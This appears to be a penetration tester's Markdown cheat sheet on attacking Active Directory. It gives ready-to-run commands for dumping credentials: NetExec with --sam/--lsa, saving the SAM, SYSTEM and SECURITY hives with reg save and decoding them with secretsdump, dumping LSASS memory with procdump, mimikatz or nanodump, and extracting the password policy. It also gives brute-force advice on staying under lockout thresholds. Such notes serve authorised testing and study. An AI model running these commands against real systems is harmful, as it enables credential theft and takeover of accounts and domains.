# Active Directory

### Table of content

- [NTDS.dit](#ntds)
- [Password management](#password-management)
    - [Dump with NetExec](#dump-with-netexec)
    - [SAM](#sam)
    - [LSA](#lsa)
    - [LSASS](#lsass)
- [BrutForce Authentification](#brutforce-authentification)
    - [Extract password Policies](#extract-password-policies)

## NTDS

NTDS.dit file is a crucial database file that stores all Active Directory data.

- User account and password
- Group memberships
- Policies and configs
- Shema informations

Default path : `%SystemRoot%\ntds\NTDS.DIT`

## Password management

### Dump with NetExec

`nxc smb <ip> -u "Administrator" -p 'mdp' --sam --lsa`

### SAM

SAM (Security Accounts Manager) is a database file that stores local user account information, including their hashed passwords, on individual Windows computers.

SAM is partially is partially crypted, and need another file to be decrypted (system)

**Manually dump SAM**

- SAM is a file, that can't be read because it is permantly open, we need to read it with register
- `reg save HKLM\SAM sam`
- `reg save HKLM\SYSTEM system`
- `secretsdump -system system -sam sam local`

### LSA

Local Security Authority (LSA) is a subsystem that is responsible for enforcing the security policy on the system.

- LSA is a part of the security register, it store :
    - MSCACHE 
        - mscache is Microsoft hashing algorithm 
        - info retrieving: `user:mscache`
        - last x interactive connection with domain credentials are cached to enable users to log on even if the DC is down
    - planned task
    - services credentials

**Manually dump LSA**

- `reg save HKLM\SECURITY security`
- `reg save HKLM\SYSTEM system`
- `secretsdump -system system -security security local`

### LSASS

After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory.

These credential materials can be harvested by an administrative user or SYSTEM.

List of creds registers

- ntlmSSP
- kerberos
- digest ssl
- credssp
- livessp
- schannel

LSASS is a process, we need to dump memory.

- **Local**
- [procdump.exe](https://learn.microsoft.com/fr-fr/sysinternals/downloads/procdump)
    - download procdump.exe on the machine
    - `procdump.exe -accepteula -ma lsass.exe lsass.dmp`
- `mimikatz.exe`
- **Remote**
- `nxc smb <ip> -u "user" -p "password" -M nanodump`

## BrutForce authentification

There is some rules to respect before brut force account on AD:

- Do not brut force AD account before reading the password policy
- Do not brut force AD Admin account because they can have a different password policy
- If account are lock after 5 unsucessfull tries, do not test more than 3. (if a user misses their password it could instant lock their account)
- Local account can't be lock, you can brut force them.
- dont forget to test:
    - user:user 
    - user:(empty)
    - wordlist

**Tools**
- `medusa` / `hydra` (dict attack)
- `hashcat`
- `john` (johntheripper)

### Extract password Policies

Require a domain user

```sh
nxc smb ip -U "" -P "" --pass-pol | grep 'domain passowrd complex'
```
